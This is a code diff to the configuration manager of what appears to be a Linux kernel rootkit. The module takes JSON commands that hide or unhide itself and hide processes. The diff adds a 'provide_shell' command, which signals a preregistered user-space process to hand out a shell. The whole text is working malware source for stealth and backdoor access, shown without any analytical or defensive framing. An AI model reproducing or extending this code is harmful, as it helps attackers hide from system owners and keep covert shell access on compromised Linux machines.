@@ -23,6 +23,7 @@
 
 #include <linux/module.h>		/* Needed for printk, KERN_INFO & asmlinkage */
 #include <linux/string.h>		/* Needed for strlen, strncmp, strncpy & simple_strtol */
+#include <linux/sched.h>		/* Needed for ... */
 
 #include "jsmn.h"				/* Needed for ... */
 #include "module_masking.h"		/* Needed for ... */
@@ -44,6 +45,7 @@
 
 /* Definition of global variables */
 static int show_debug_messages;
+struct task_struct *shell_provider_task;
 jsmn_parser p;
 int i;
 jsmntok_t t[128];   /* We expect no more than 128 tokens */
@@ -51,7 +53,7 @@ static char values[32][128];
 
 
 /* Declaration of functions */
-int conf_manager_init(int);
+int conf_manager_init(int, int);
 int conf_manager_exit(void);
 
 int update_conf(char *buffer);
@@ -70,9 +72,20 @@ static int extract_array_values(char *);
 
 
 /* Initialization function */
-int conf_manager_init(int debug_mode_on)
+int conf_manager_init(int debug_mode_on, int shell_provider_pid)
 {
 	show_debug_messages = debug_mode_on;
+
+	rcu_read_lock();
+
+	/* Find the task_struct associated with this pid */
+	shell_provider_task = pid_task(find_vpid(shell_provider_pid), PIDTYPE_PID); //find_task_by_pid_type(PIDTYPE_PID, shell_provider_pid);
+	if (shell_provider_task == NULL) {
+		DEBUG_PRINT("[Error] no such PID");
+		rcu_read_unlock();
+
+		return -ENODEV;
+	}
 
 	DEBUG_PRINT("initialized");
 
@@ -105,6 +118,7 @@ static int parse_json(char *json_str)
 	char *endptr;
 	int pid;
 	int port;
+	struct siginfo info;
 
 	jsmn_init(&p);
 	r = jsmn_parse(&p, json_str, strlen(json_str), t, sizeof(t)/sizeof(t[0]));
@@ -135,6 +149,19 @@ static int parse_json(char *json_str)
 			printk(KERN_INFO "%s: %s\n", "unhide_module", (flag) ? "true" : "false");
 			if (flag)
 				unmask_module();
+
+		} else if (!jsoneq(json_str, &t[i], "provide_shell")) {
+			if ((flag = extract_boolean_value(json_str)) == -1)
+				continue;
+			printk(KERN_INFO "%s: %s\n", "provide_shell", (flag) ? "true" : "false");
+			if (flag) {
+				memset(&info, 0, sizeof(struct siginfo));
+				info.si_signo = SIGRTMIN+2;
+				info.si_code = SI_QUEUE;
+				info.si_int = 1234;
+
+				send_sig_info(SIGRTMIN+2, &info, shell_provider_task);
+			}
 
 		} else if (!jsoneq(json_str, &t[i], "hide_processes")) {
 			count = extract_array_values(json_str);
